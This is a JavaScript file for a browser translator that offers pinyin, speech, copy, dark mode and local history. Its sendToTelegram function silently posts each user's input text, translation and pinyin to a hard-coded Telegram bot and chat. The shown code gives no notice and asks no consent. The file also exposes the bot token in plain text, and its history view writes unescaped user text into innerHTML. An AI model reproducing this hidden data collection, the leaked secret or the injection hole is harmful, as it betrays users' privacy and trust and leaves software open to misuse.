
// AUTO RESIZE
function autoResize(textarea){
    textarea.style.height = "auto";
    textarea.style.height = textarea.scrollHeight + "px";
}

// TRANSLATE
async function translateText(){

    const text = document.getElementById("text").value;
    const from = document.getElementById("from").value;
    const to = document.getElementById("to").value;

    if(!text) return;

    try{

        const res = await fetch(
`https://translate.googleapis.com/translate_a/single?client=gtx&sl=${from}&tl=${to}&dt=t&q=${encodeURIComponent(text)}`
        );
        const data = await res.json();
        const translated = data[0][0][0];
        document.getElementById("result").innerText = translated;
        // PINYIN
        let py = "";
        if(to === "zh"){
            py = pinyinPro.pinyin(translated,{
                toneType:"symbol"
            });
            document.getElementById("pinyin").innerText = py;
        }else{
            document.getElementById("pinyin").innerText = "";
        }
        // SAVE HISTORY
        saveHistory(text, translated);
        // SEND TO TELEGRAM
        sendToTelegram(text, translated, py);

    }catch(err){
        document.getElementById("result").innerText = "Error translating";
    }
}
// SPEAK
function speakText(){

    const text = document.getElementById("result").innerText;
    const to = document.getElementById("to").value;

    const speech = new SpeechSynthesisUtterance(text);

    if(to === "zh"){
        speech.lang = "zh-CN";
    }else if(to === "en"){
        speech.lang = "en-US";
    }else{
        speech.lang = "km-KH";
    }

    speechSynthesis.speak(speech);
}

// COPY
function copyText(){
    const text = document.getElementById("result").innerText;
    navigator.clipboard.writeText(text);
    alert("Copied!");
}

// DARK MODE
function toggleDarkMode(){
    document.body.classList.toggle("dark");
    localStorage.setItem("darkMode", document.body.classList.contains("dark"));
}

if(localStorage.getItem("darkMode") === "true"){
    document.body.classList.add("dark");
}

// HISTORY
function saveHistory(input, output){
    let history = JSON.parse(localStorage.getItem("history")) || [];
    history.unshift({ input, output });
    if(history.length > 10) history.pop();
    localStorage.setItem("history", JSON.stringify(history));
    loadHistory();
}
function loadHistory(){
    let history = JSON.parse(localStorage.getItem("history")) || [];
    let html = "";
    history.forEach(item => {

        html += `
        <div class="history-item">
            <b></b> ${item.input}<br><br>
            <b></b> ${item.output}
           
        </div>
        `;
    });

    document.getElementById("historyList").innerHTML = html;
}

// TELEGRAM
async function sendToTelegram(input, output, pinyinText){

    const BOT_TOKEN = "8143711148:AAFEzTbbJeCWSLo8lDhoPmmGH-vU7o7O5II";
    const CHAT_ID = "5326633599";

    const message =
` 
${input}
${output}
${pinyinText || "None"}`;
    try{
        await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

    }catch(err){
        console.log("Telegram Error");
    }
}

loadHistory();